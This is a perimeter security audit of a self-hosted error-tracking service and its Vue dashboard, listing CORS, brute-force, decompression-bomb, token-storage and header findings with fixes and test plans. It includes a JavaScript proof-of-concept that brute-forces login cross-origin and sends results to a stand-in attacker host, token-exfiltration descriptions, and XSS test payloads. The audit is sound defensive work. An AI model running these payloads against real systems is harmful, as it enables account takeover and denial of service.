# A4 — Perimeter

## Summary

**Scope.** The unauthenticated internet-facing surface and the victim's browser:
`packages/workers-sentinel/src/routes/ingestion.ts`, `src/lib/envelope-parser.ts`, `src/routes/auth.ts`, `src/middleware/auth.ts`, `src/index.ts` (route mounting + CORS), `packages/workers-sentinel/wrangler.jsonc` (assets/observability), `packages/dashboard/vite.config.ts`, `packages/dashboard/index.html`, and `packages/dashboard/src/**` (`api/client.ts`, `stores/auth.ts`, `router/index.ts`, `views/IssueDetail.vue`, `views/EventDetail.vue`, `lib/sourcemap-resolver.ts`, plus a full-tree sink sweep). Cross-referenced into `src/durable-objects/auth-state.ts` and `project-state.ts` only where perimeter behavior depends on them (login throttling, password hashing, quota).

**Method.** Static analysis only (per task constraints). Line-by-line review of every file above; repo-wide greps for XSS sinks (`v-html`, `innerHTML`, `document.write`, `eval`, `srcdoc`), redirect sinks (`window.open`, `location.*`), cookie usage (`Set-Cookie`), and auth-header handling. Two empirical micro-checks were run against the repo's own installed `hono@^4.6.14` via `node -e` (no dev stack, no state touched): (1) Hono path-pattern semantics for `app.use('/api/projects/*')` vs the bare `/api/projects` path, and (2) the exact CORS headers the configured middleware emits (simple request + preflight). Test files under `packages/workers-sentinel/test/` were read as coverage evidence.

**Confidence.** High for wiring/CORS/header findings (empirically confirmed against the pinned Hono version), high for dashboard XSS/token findings (exhaustive sink sweep, zero hits), medium for DoS findings (mechanism is clear from code; blast radius on Workers isolates inferred, not measured). Unthrottled login / unsalted SHA-256 passwords live partly in `auth-state.ts` (likely Analyst A2's slice) — flagged here because `/api/auth/login` is perimeter; dedupe as needed.

**Findings: 0 CRITICAL / 2 HIGH / 4 MEDIUM / 3 LOW / 4 INFO.**

## Findings

### [HIGH] A4-01 — CORS wildcard `origin: '*'` with `credentials: true` on the entire `/api/*` surface

**File:** `packages/workers-sentinel/src/index.ts:30-38`

**Description.** The only global middleware is:

```ts
app.use('/api/*', cors({
	origin: '*',
	allowHeaders: ['Content-Type', 'Authorization'],
	allowMethods: ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'OPTIONS'],
	credentials: true,
}));
```

Empirically confirmed with the repo's `hono@4.6.14`: every response (and preflight) carries `Access-Control-Allow-Origin: *` plus `Access-Control-Allow-Credentials: true`, and preflights approve `POST` with `Authorization` for any requesting origin. Two distinct problems:

1. **Wildcard read access.** `ACAO: *` lets *any* website read the response body of *any* `/api/*` endpoint in a non-credentialed request. Every endpoint that doesn't require ambient authority becomes readable cross-origin — including the unthrottled `/api/auth/login` and `/api/auth/register`.
2. **The `credentials: true` flag is dead-but-dangerous config.** Browsers reject literal `*` for credentialed reads (Fetch spec), and no cookies are used anywhere today (`Set-Cookie` appears nowhere in the codebase), so there is no *current* credentialed leak. But the flag documents intent to allow credentialed cross-origin use; the moment cookie/session-ambient auth or origin reflection is added, this becomes a full account-takeover-grade CORS hole.

**Concrete production exploitation.** Attacker hosts a page on `https://evil.example` containing:

```js
fetch('https://sentinel.victim.example/api/auth/login', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ email: 'admin@victim.example', password: nextGuess() }),
}).then(r => r.json()).then(j => navigator.sendBeacon('https://evil.example/leak', JSON.stringify(j)));
```

Today's headers make that response readable from `evil.example` (no credentials needed). Each visitor of the attacker's page becomes a distinct source IP for password guessing against the victim's Sentinel instance — free distributed, unattributed brute force that defeats any IP-based rate control (there is none, see A4-02). The 200-vs-401 body distinguishes a correct password instantly; the returned bearer token then works from anywhere. `/api/auth/register`'s 409 on existing email additionally gives cross-origin user enumeration. The same wildcard read applies to `/api/health` and (with an attacker-known DSN) any future unauthenticated endpoint.

**Remediation.** Restrict to the dashboard origin (config-driven allowlist, e.g. `origin: (o) => ALLOWED_ORIGINS.includes(o) ? o : undefined`); drop `credentials: true` unless cookie auth is actually introduced (then never with a wildcard); keep `allowMethods` minimal. Add a test asserting no `*` is ever emitted with `Allow-Credentials: true` (see throughlines T1/T2).

### [HIGH] A4-02 — Unthrottled public login combined with unsalted SHA-256 password hashing

**File:** `packages/workers-sentinel/src/routes/auth.ts:38-58` (no limiter), `src/durable-objects/auth-state.ts:1081-1092` (`hashPassword`/`verifyPassword`), no lockout/throttle code anywhere in `auth-state.ts`

**Description.** `POST /api/auth/login` is public, forwards straight to the AuthState DO, and nothing in the path counts failed attempts, locks accounts, or rate-limits by IP/account. Passwords (and API tokens) are stored as **plain unsalted SHA-256** (`crypto.subtle.digest('SHA-256')`, hex compare with `===`). Fast, un-salted hashing means any DB compromise yields trivially crackable password hashes (GPU billions/sec), and the perimeter offers unlimited online guessing.

**Concrete production exploitation.** Online: `curl`-loop (or the CORS-assisted distributed loop from A4-01) against `/api/auth/login` with a password list — no 429, no lockout, no CAPTCHA; responses distinguish 401 (bad password) from 200 (token issued). Offline: a leaked `users` table cracks common passwords in seconds per hash. Session tokens are long-lived (30 days, `auth-state.ts:1057-1065`), so one success yields a month of access. (Password hashing ownership likely sits with the auth-DO analyst — included here because the unthrottled public endpoint is perimeter.)

**Remediation.** Per-account + per-IP failed-login throttling with exponential backoff and a generic error; switch to PBKDF2/scrypt (WebCrypto PBKDF2 with ≥100k iterations, per-user salt, or Workers-native `scrypt` polyfill); consider CAPTCHA after N failures; keep token TTL shorter or add refresh.

### [MEDIUM] A4-03 — Unbounded request body and gzip decompression bomb on the unauthenticated ingestion endpoint

**File:** `packages/workers-sentinel/src/routes/ingestion.ts:84-111`, `src/lib/envelope-parser.ts:169-180` (`maybeDecompress`)

**Description.** `handleIngestion` reads the *entire* body with `c.req.arrayBuffer()` and, when `Content-Encoding: gzip`, pipes it through `DecompressionStream('gzip')` with **no size cap and no decompressed-length limit**. The only quota in the system (`max_events_per_hour`, `project-state.ts:1638-1654`) is enforced *inside the ProjectState DO, after parsing* — and **defaults to unlimited (0)** (`rate-limiting.test.ts:21` confirms). Parse-stage work is therefore entirely unthrottled, and stored event size is unbounded (quota counts events, not bytes).

The only gate before the bomb goes off is a valid DSN public key (`ingestion.ts:56-77`) — but DSN public keys are *public by design* (shipped in every browser app that reports to the project, `auth-state.ts:359`: 32 hex chars). "Anonymous" in practice means "anyone who can read any victim site's DSN", i.e., everyone.

**Concrete production exploitation.** (a) *Decompression bomb:* POST ~50 MB of gzip-compressed zeros (a few hundred KB on the wire, under any WAF size heuristic) with `Content-Encoding: gzip` and a valid `sentry_key`. `DecompressionStream` + `Response.text()` try to materialize gigabytes in a 128 MB-isolate → isolate OOM/CPU-limit kill; repeat in a loop to burn CPU at the edge colo. (b) *Storage exhaustion:* envelope with one giant event payload (within the platform body cap) is stored verbatim in the project's DO SQLite; the event quota (if ever configured) counts it as 1. (c) *Free pre-quota CPU:* malformed-envelope floods cost parse cycles before any limit applies.

**Remediation.** Enforce a hard `Content-Length` cap (e.g. 1–5 MB) at the top of `handleIngestion` before reading the body; wrap decompression with a byte-budget (read the stream incrementally with a `TransformStream` counter, abort past N bytes); cap stored event size (truncate or reject oversized events in `ProjectState.handleIngest`); count *requests* against the hourly quota, not just accepted events; default the quota to a finite value.

### [MEDIUM] A4-04 — Session/API tokens in `localStorage` with no CSP backstop (XSS→account-theft chain)

**File:** `packages/dashboard/src/api/client.ts:12-14` (`getToken`), `src/stores/auth.ts:25,62,80` (read/persist)

**Description.** The 30-day session token (and any implicit access it grants) is stored in `localStorage['token']` and attached as `Authorization: Bearer …` on every call. `localStorage` is readable by *any* script running on the dashboard origin — and because A4-05 shows there is no CSP and no frame-busting, a single future XSS (a compromised dependency, a future `v-html`, a browser extension) exfiltrates a long-lived bearer token that cannot be revoked except by deleting the session server-side (users have no "log out everywhere"; logout only invalidates the presented token, `routes/auth.ts:61-81`).

**Concrete production exploitation.** Supply-chain or script-injection XSS on the dashboard origin runs `fetch('/api/auth/me',{headers:{Authorization:'Bearer '+localStorage.token}})` or simply exfiltrates `localStorage.token` to the attacker; the victim's 30-day session is now fully portable to the attacker's machine, including admin accounts (`/api/admin/*` uses the same middleware).

**Remediation.** Move the token to a `HttpOnly; Secure; SameSite=Strict` cookie (requires server change + CSRF tokens, since the API currently has zero cookie handling) or at minimum keep bearer-in-memory with silent refresh; shorten session TTL; add a "revoke all sessions" control; pair with a real CSP (A4-05) so any future injection is containment-limited.

### [MEDIUM] A4-05 — No browser hardening headers at all (CSP, X-Frame-Options/frame-ancestors, HSTS, nosniff, Referrer-Policy) and no `_headers` file

**File:** `packages/workers-sentinel/src/index.ts` (no header middleware anywhere), `packages/workers-sentinel/wrangler.jsonc:34-40` (assets with no `_headers` support used — `packages/dashboard/public/` is empty), `packages/dashboard/index.html` (no CSP meta)

**Description.** Every JSON response from the Worker and every static asset response ships with zero security headers: no `Content-Security-Policy` (the SPA has *no* CSP, so any injected inline script runs unrestrained), no `X-Frame-Options`/`frame-ancestors` (dashboard can be framed), no `Strict-Transport-Security`, no `X-Content-Type-Options: nosniff` (JSON APIs renderable/sniffable), no `Referrer-Policy`. Workers static assets honor a `_headers` file in the assets directory — none exists.

**Concrete production exploitation.** (a) *Clickjacking:* `evil.example` iframes `https://sentinel.victim.example/` and overlays buttons over "Resolve"/"Ignore"/"Delete project" — no `frame-ancestors` stops it; authenticated victims perform destructive actions (API is CSRF-safe only because it's bearer-header based; the *clicks* are the attack). (b) *XSS blast radius:* any future injection (see A4-04) executes with no CSP constraint — no script-src allowlist, no `object-src 'none'`. (c) `nosniff` absence matters for the ingestion/asset surfaces serving attacker-influenced content (e.g. SPA fallback serving HTML at arbitrary paths, A4-11).

**Remediation.** Add `_headers` to `packages/dashboard/public/` (propagates into `dist/`): `/*` → `X-Frame-Options: DENY`, `X-Content-Type-Options: nosniff`, `Referrer-Policy: strict-origin-when-cross-origin`, `Strict-Transport-Security: max-age=31536000; includeSubDomains`; CSP for the SPA (`default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src 'self'`; tighten `unsafe-inline` later via nonces); add `nosniff` to Worker API responses via a tiny `app.use` middleware.

### [MEDIUM] A4-06 — Open, unthrottled self-registration with no disable switch; first registered user becomes admin

**File:** `packages/workers-sentinel/src/routes/auth.ts:12-35`, `src/durable-objects/auth-state.ts:185` (`const role = isFirstUser ? 'admin' : 'member'`), `src/routes/projects.ts:35` (any authenticated user may create projects)

**Description.** `POST /api/auth/register` is public, requires no invite/confirmation, has no throttle and no configuration flag to close it. Every new account is a working login that can immediately create projects (and thus DSNs and storage). The "first user is admin" bootstrap means a race on a freshly deployed instance hands the attacker the admin role permanently. Registration also returns a valid session token immediately.

**Concrete production exploitation.** Scanner finds a fresh `workers-sentinel` deployment 10 minutes after it goes live → registers first → `role: admin` → full `/api/admin/*` access (user listing/admin routes, `routes/admin.ts` behind the same middleware) forever. On established instances: mass-register accounts (storage/CPU abuse in the singleton AuthState DO, which serializes *all* auth traffic), create unlimited projects/DOs, and use the instance as a free error-sink. 409 on duplicate email yields user enumeration (cross-origin readable via A4-01).

**Remediation.** Make registration configurable (default off or invite-code) for self-hosted deployments; require admin confirmation or email verification before a new account can create projects; protect the "first user" bootstrap with a deployment-time setup token from an environment secret; throttle register/login per IP.

### [LOW] A4-07 — DSN public key accepted via `?sentry_key=` query parameter: key lands in URLs, logs, and observability telemetry

**File:** `packages/workers-sentinel/src/routes/ingestion.ts:29-33`

**Description.** The ingestion endpoint accepts the DSN public key as a URL query parameter (`?sentry_key=…`), the legacy Sentry browser-SDK path. URLs are the most widely duplicated artifact in any serving stack: `observability.enabled: true` (`wrangler.jsonc:7-9`) captures invocation logs; proxy/CDN access logs, `cf`-side logs, and any future redirect or `Referer` leak reproduce the full URL. For *server-side* SDKs the DSN key is intended to be semi-secret (it's the only credential for ingestion — possession authorizes unlimited event writes to that project); for browser SDKs it is already public, which is exactly why treating it as a URL component for the server case is wrong.

**Concrete production exploitation.** Operator exports Workers observability logs or CDN logs into a third-party log aggregator with broader read access than the Sentinel deployment; server-SDK DSNs (used in `Authorization`-header mode by legitimate server SDKs) that were also ever sent via the query variant now appear in plaintext, letting anyone in log-reader scope spoof-inject events, poison issue statistics, fill quotas, and trigger webhooks (`ingestion.ts:152-176` fires on `isNewIssue` — log-noise events can spam real webhook endpoints).

**Remediation.** Prefer header-based auth (`X-Sentry-Auth`/Basic already supported, `ingestion.ts:36-54`); if the query param must stay for browser SDK compat, scrub `sentry_key` from observability logs (`wrangler.jsonc` `observability.hostnames`/log filtering, or avoid logging URLs); document that server SDKs must not use the query variant.

### [LOW] A4-08 — Case-sensitive `Bearer ` prefix and scheme confusion in header parsing (`substring(7)` on arbitrary schemes)

**File:** `packages/workers-sentinel/src/middleware/auth.ts:12-21`, `src/routes/auth.ts:63,87,115-128`

**Description.** All bearer extraction uses `authHeader.startsWith('Bearer ')` — exact case. RFC 7235 makes the auth-scheme token case-insensitive, so `Authorization: bearer <token>` / `BEARER <token>` are rejected with 401 (interop bug, fail-closed). Conversely, the API-token management guard in `tokenRoutes.use('*')` (`auth.ts:115-128`) does `authHeader?.substring(7) || ''` on *any* scheme: `Authorization: Token wst_abc` yields `wst_abc` and is classified as an API token (403 "API token management requires session authentication"). That direction fails closed, but it shows the guard keys off raw substring offsets rather than a parsed scheme — brittle if token formats or schemes change. Not directly exploitable today (all confusion paths end in 401/403), hence LOW.

**Concrete production exploitation.** None direct; the realistic risk is future regression — e.g., someone "fixes" case-insensitivity in the middleware but not in the `wst_` prefix guard, or a new scheme (`Basic`) is added whose `substring(7)` happens to produce a `wst_`-looking value, silently misclassifying auth type and weakening the "API tokens cannot manage API tokens" invariant (the only thing standing between a leaked `wst_` token and minting new tokens).

**Remediation.** Parse the header once (`const [scheme, ...rest] = h.split(' ')`, compare `scheme.toLowerCase() === 'bearer'`) in a shared helper used by middleware, `/me`, `/logout`, and the token guard; have the guard consult `c.get('auth')` metadata (session vs API token) returned by the DO instead of re-deriving it from the raw string.

### [LOW] A4-09 — `X-Sentry-Auth` parsing quirks: value truncated at first `=`, keys not trimmed, strict `Sentry ` prefix

**File:** `packages/workers-sentinel/src/lib/envelope-parser.ts:123-137`

**Description.** `extractKeyFromAuthHeader` splits each comma-part with `part.trim().split('=')` and takes element `[1]` as the value: (a) a `sentry_key` value containing `=` (e.g. base64-padding-bearing keys, if key format ever changes) is silently truncated at the first `=`; (b) the *key* is not trimmed before comparison, so `sentry_key = x` (space before `=`) never matches; (c) `header.startsWith('Sentry ')` is case-sensitive while SDKs sometimes send `sentry …`. All paths fail closed (401 `missing_auth` or fall through to Basic), so this is robustness, not exposure — but a truncated key can *authenticate as a different key* if one key is a prefix-truncation of another; with the current 32-hex format that can't collide, and the DO lookup would 401 anyway.

**Concrete production exploitation.** Practical impact limited to legitimate-SDK interop failures (some SDK/transport combos would silently fail auth). The prefix-collision scenario requires a future key format containing `=`.

**Remediation.** Use `part.split('=')` then `key.trim()`, `value = rest.join('=')`; lowercase-tolerant scheme prefix; add unit tests for `=` in value and whitespace variants.

### [INFO] A4-10 — `GET /api/{projectId}/security` is an unauthenticated stub hardcoding `allowedDomains: ['*']`

**File:** `packages/workers-sentinel/src/routes/ingestion.ts:185-191`

**Description.** The Sentry security-configuration endpoint accepts any path parameter, requires no DSN, and returns `{allowedDomains:['*'], scrubData:true}` unconditionally. No data leaks (response is static), but it (a) misreports to browser SDKs that all domains may report (cosmetic), and (b) is an unauthenticated GET wedge under `/api/` that future edits could easily turn into a real config disclosure. Also relevant: it proves the `/api/{projectId}/…` ingestion pattern (`index.ts:52`) matches paths other than `envelope|store` — currently harmless (only this stub).

**Remediation.** Validate the DSN like ingestion does or remove the endpoint; don't advertise `allowedDomains: ['*']` unless intended.

### [INFO] A4-11 — `run_worker_first` lists `/docs` and `/openapi.json` but no such routes exist; SPA fallback serves HTML 200 at arbitrary paths

**File:** `packages/workers-sentinel/wrangler.jsonc:39`, `src/index.ts:69-72` (grep for `openapi|docs|swagger` in `src/` → no matches)

**Description.** Requests to `/docs` or `/openapi.json` are forced into the Worker, match nothing, fall into `app.get('*')` → `ASSETS.fetch` → with `not_found_handling: "single-page-application"` return `index.html` with **200**. So `GET /openapi.json` returns `text/html` (combined with missing `nosniff`, A4-05). Stale config plus a catch-all that never 404s for GETs. Not directly exploitable; minor scanner-noise and content-type confusion surface.

**Remediation.** Drop `/docs`/`/openapi.json` from `run_worker_first` until the routes exist, or add them; consider `none`/404 for obvious non-asset paths on API-ish prefixes.

### [INFO] A4-12 — Envelope parser silently skips malformed item headers (frame misalignment) and coerces unparsable payloads to strings

**File:** `packages/workers-sentinel/src/lib/envelope-parser.ts:34-49` (skip on JSON failure), `58-75` (string fallback), `142-159` (`extractEvents` mutates payload)

**Description.** If an item header line fails `JSON.parse`, the parser skips it and treats the *next* line as a header — a crafted envelope can shift which lines are interpreted as headers vs payloads. If a payload fails to parse it is kept as a raw string, and `extractEvents` then does `event.event_id` on a value that may be a primitive string (throws TypeError in strict mode) — caught upstream by the `try/catch` at `ingestion.ts:98-111` and returned as `parse_failed` 400, so no crash escapes, but malformed input produces misleading errors and `type` is cast without validation (`itemHeader.type as EnvelopeItem['type']`). All fail-closed; recorded for robustness and because these parsing quirks shape what "valid" attacker input can reach storage.

**Remediation.** Strict parser: reject non-JSON headers (or require them to be empty), validate `type` against an allowlist, require payloads for `event` items to be objects.

### [INFO] A4-13 — Observability logs capture attacker-influenced content (`console.error` of parse/ingest errors)

**File:** `packages/workers-sentinel/src/routes/ingestion.ts:109,145`; `wrangler.jsonc:7-9` (`observability.enabled: true`)

**Description.** Parse failures log the error object (`console.error('Parse error:', error)`) and DO ingest failures log response text. Error messages from `JSON.parse` include attacker-supplied snippets; ingest error text can include event fragments. With observability enabled these land in Workers Logs — a log-injection/noise vector (multi-line forged "log entries") and a place where envelope contents (potentially containing PII from victim apps' SDKs) persist beyond retention intent. Pairs with A4-07 (`sentry_key` in logged URLs).

**Remediation.** Log fixed messages + correlation IDs, not raw error objects/bodies; set `observability.head_sampling_rate` if volume is a concern; scrub `sentry_key` query params.

## Integration test throughlines

The current suite covers: X-Sentry-Auth and `?sentry_key=` happy paths, invalid-key 401, legacy `/store/`, login/me/logout happy+invalid, API-token CRUD/auth/expiry/revoke/unauthenticated rejection, per-project hourly quota incl. default-unlimited, first-user-admin. **Not covered anywhere:** CORS headers, preflight, Basic-auth ingestion, project-mismatch, body size/decompression, case-variant schemes, header quirks, browser rendering of hostile payloads, response hardening headers. Concrete scenarios to pin (method + path + preconditions + expected):

1. **T1 — CORS preflight from untrusted origin.** `OPTIONS /api/auth/login`, headers `Origin: https://evil.example`, `Access-Control-Request-Method: POST`, `Access-Control-Request-Headers: authorization,content-type`. Expected (post-fix): 204 with `Access-Control-Allow-Origin` absent or the configured dashboard origin only; never `*`; assert `Access-Control-Allow-Credentials` is absent unless cookie auth exists. (Today: 204 with `*` — the test should encode the *desired* policy and fail until fixed.)
2. **T2 — Cross-origin read of login response.** From a browser-driven test (or by asserting the header), `GET/POST /api/auth/login` with `Origin: https://evil.example` must not be readable cross-origin post-fix: assert `Access-Control-Allow-Origin` is not `*` on `/api/auth/*` responses.
3. **T3 — Bare-path middleware regression.** `GET /api/projects` and `POST /api/projects` with **no** `Authorization` → 401 both. Guards the Hono pattern quirk (`/api/projects/*` currently does match the bare path in hono 4.6.14 — verified empirically — but this is easy to break on framework upgrades).
4. **T4 — Ingestion project mismatch.** `POST /api/{projectA-id}/envelope/?sentry_key={projectB-key}` with a valid envelope → 400 `project_mismatch` (today's behavior, `ingestion.ts:80-82`); also `POST /api/auth/envelope/?sentry_key={valid}` → 400 (ingestion pattern under `/api/auth` must not create a side channel) and `POST /api/projects/envelope/?sentry_key={valid}` → 400.
5. **T5 — Unauthenticated ingestion variants.** No auth → 401; `X-Sentry-Auth: sentry sentry_key=…` (lowercase scheme) → 401 (pin current strictness or fix to accept); `Authorization: Basic <base64 of key:>` → 200/400-by-body; `Authorization: Basic <base64 without colon>` → key = whole string → 401 invalid DSN. All require no session.
6. **T6 — Body-size cap & decompression bomb.** `POST /api/{id}/envelope/?sentry_key=valid` with `Content-Encoding: gzip` and a gzip bomb (e.g. 10 MB of zeros on the wire) → expect fast 413/400 with no observable isolate crash; and a >N MB plain body → 413. Today: unbounded decompress attempt — the test pins the *desired* cap.
7. **T7 — Quota counts requests pre-parse.** Set `maxEventsPerHour=5`, then send 10 garbage (unparseable) envelopes: today they don't count (quota increments only on stored events, `project-state.ts:464-470`); desired: repeated requests themselves throttled. Pin one behavior explicitly.
8. **T8 — Login brute-force throttle.** ≥N failed `POST /api/auth/login` for the same email/IP → 429 or lockout (desired); assert failure responses are identical for wrong-password vs unknown-email (today both 401 — keep) so no oracle regression.
9. **T9 — Token-management guard.** `POST/GET /api/auth/tokens` with `Authorization: Bearer wst_…` → 403 (session-only); with `Authorization: Token wst_…` → 401 (middleware rejects non-Bearer); with `Authorization: bearer <session>` (lowercase) → decide-and-pin.
10. **T10 — Hostile payload rendering (SPA).** Ingest an event whose `exception.values[0].value`, `message`, tags, user.email, breadcrumb messages contain `<img src=x onerror=window.__xss=1>` and `{{constructor.constructor('...')()}}`; then render IssueDetail/EventDetail in a component test → assert `window.__xss` undefined and the literal text is displayed. Locks in the (currently clean) no-`v-html` invariant against future refactors.
11. **T11 — Response hardening headers.** `GET /` and `GET /api/health` → assert `X-Content-Type-Options: nosniff`, CSP on `/`, `X-Frame-Options: DENY` (post-`_headers` fix). Today absent — pin desired.
12. **T12 — SPA fallback content-type.** `GET /openapi.json` → today 200 `text/html` (SPA). Decide: 404 JSON or real spec; pin it (A4-11).
13. **T13 — Open-registration posture.** Fresh instance: second registration is `member` and cannot `GET /api/admin/users`; optionally, with a hypothetical `REGISTRATION_CLOSED` flag set, `POST /api/auth/register` → 403 (post-fix).
14. **T14 — Logout without credentials.** `POST /api/auth/logout` with no header → 200 `{success:true}` (today; harmless — pin so nobody "fixes" it into an oracle).

## Non-issues / hardening notes

**Checked and sound:**

- **No XSS sinks in the dashboard.** Exhaustive grep of `packages/dashboard/src/**` for `v-html`, `innerHTML`, `outerHTML`, `insertAdjacentHTML`, `document.write`, `eval`, `srcdoc`, `javascript:` → zero hits. `IssueDetail.vue` renders every attacker-controlled field (issue metadata type/value lines 301–306, culprit 306, stack frames + source context 513–515, breadcrumbs 534, user fields 645–660, tags 664–675) and `EventDetail.vue` the entire raw event JSON (line 66, `<pre>{{ JSON.stringify(event) … }}</pre>`) exclusively through `{{ }}` text interpolation — Vue escapes these. Comments (`IssueDetail.vue:612`) likewise escaped.
- **No open redirect.** Router pushes fixed paths only (`router/index.ts:103-110` → `/login`, `/`); `Login.vue:15` pushes `'/'`; the only param-derived redirect is `projects/:slug → projects/:slug/overview` (same-app path, `router/index.ts:39-41`). No `window.open`/`location.*` sinks anywhere in `src/`.
- **Sourcemap resolver is same-origin and authenticated.** `lib/sourcemap-resolver.ts:40-42` only calls `GET /api/projects/{slug}/sourcemaps/resolve` with `encodeURIComponent`d params (auth via `client.ts` bearer). No client-side fetch of attacker URLs; server side, `fileUrl` is used solely as a DO storage lookup key (`routes/sourcemaps.ts:121-127`) — no SSRF vector from attacker-crafted stack frames.
- **No cookie auth anywhere → no CSRF surface.** `Set-Cookie`/cookie parsing appears nowhere; all auth is an explicit bearer header, which cross-origin pages cannot attach without knowing the token. (Corollary: today's `credentials:true` CORS flag is inert — but see A4-01.)
- **Route ordering does not expose protected handlers unauthenticated, and ingestion cannot shadow them.** Mount order (`index.ts:44-66`): `/api/auth` (public) → token middleware+routes → `/api` ingestion → `/api/projects/*` middleware+routes → `/api/admin/*`. Ingestion only registers `/:projectId/{envelope,store}{,/}` + `/:projectId/security`, so it can only capture paths ending in those segments; `POST /api/projects/…` that matches ingestion (e.g. `/api/projects/envelope`) dies on the project-ID mismatch check (`ingestion.ts:80-82`). Bare-path protection verified empirically against hono 4.6.14: `app.use('/api/projects/*')` **does** match `/api/projects` (mw hit = true), so list/create are behind `authMiddleware`; handlers additionally self-check `c.get('auth')` (`projects.ts:36-38`).
- **Token/session entropy and lifecycle are solid.** Sessions: 64-hex (256-bit) random IDs, 30-day expiry, expired-session cleanup (`auth-state.ts:1057-1078`). API tokens: `wst_` + 64 hex (256-bit), hashed at rest, expiry + revoke + `last_used_at`, max 10/user, and API tokens cannot manage tokens (`routes/auth.ts:115-128`, fail-closed). Unsalted-SHA-256 is *acceptable* for high-entropy tokens (preimage infeasible); it is the *password* use that is the problem (A4-02).
- **DSN validation is fail-closed and per-project.** Missing key → 401; unknown key → 401; URL project ≠ key's project → 400 (`ingestion.ts:56-82`). The 401-vs-400 distinction is an inherent DSN-design key-confirmation oracle, not a bug.
- **Vite build leaks nothing.** `vite.config.ts` defines no `define`/env inlining; no `import.meta.env` usage beyond type declarations (`src/vite-env.d.ts`); the `/api` proxy is dev-only.
- **`run_worker_first: ["/api/*"]` is complete for the API surface** — every Worker-mounted route lives under `/api/`; non-API GETs go to assets, and the Worker's `app.get('*')` re-fetches `ASSETS` as a belt-and-braces fallback (`index.ts:69-72`). No asset path can shadow an API route or vice versa.
- **Webhook SSRF requires project-admin settings access** (post-auth), out of anonymous reach; noted for the projects/settings analyst rather than perimeter.

**Defense-in-depth ideas (beyond the findings):**

- Turn the per-project hourly quota **default** from unlimited to a sane finite number (`rate-limiting.test.ts` documents default 0 = unlimited).
- Add a WAF/Cloudflare rule capping request body size for `/api/*/envelope/` and request rate for `/api/auth/*`.
- Emit `Vary: Origin` if origin ever becomes dynamic (not needed for static `*`, required the day reflection is added).
- Consider short-lived ingestion "client keys" distinct from the DSN public key so browser-public keys can't write at unlimited rate (matches the quota-counts-requests idea, T7).
- Add a component-test CI guard (grep gate) failing on any `v-html`/`innerHTML` introduced into `packages/dashboard/src`.
- Log correlation IDs instead of raw error payloads (A4-13) and scrub `sentry_key` from any URL logging.
